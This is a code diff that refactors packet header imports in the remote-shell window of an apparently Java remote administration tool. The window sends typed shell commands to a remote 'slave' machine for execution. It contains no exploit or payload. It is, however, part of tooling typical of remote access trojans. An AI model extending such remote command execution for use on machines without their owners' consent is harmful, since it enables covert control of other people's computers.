@@ -19,8 +19,8 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 
 @SuppressWarnings("serial")
@@ -57,7 +57,7 @@ public class FrameRemoteShell extends BaseFrame {
 			@Override
 			public void keyPressed(KeyEvent e) {
 				if (e.getKeyCode() == KeyEvent.VK_ENTER && textField.getText().trim().length() > 0) {
-					sl.addToSendQueue(new PacketBuilder(Header.CMD_EXECUTE, new String[] { textField.getText().trim() }));
+					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.CMD_EXECUTE, new String[] { textField.getText().trim() }));
 					textField.setText("");			
 				}
 			}
@@ -87,11 +87,11 @@ public class FrameRemoteShell extends BaseFrame {
 		);
 		contentPane.setLayout(gl_contentPane);
 		
-		slave.addToSendQueue(Header.CMD_RUN);
+		slave.addToSendQueue(OutgoingHeader.CMD_RUN);
 	}
 
 	public void exit() {
-		slave.addToSendQueue(Header.CMD_END);
+		slave.addToSendQueue(OutgoingHeader.CMD_END);
 		slave = null;
 		instances.remove(slave);
 	}
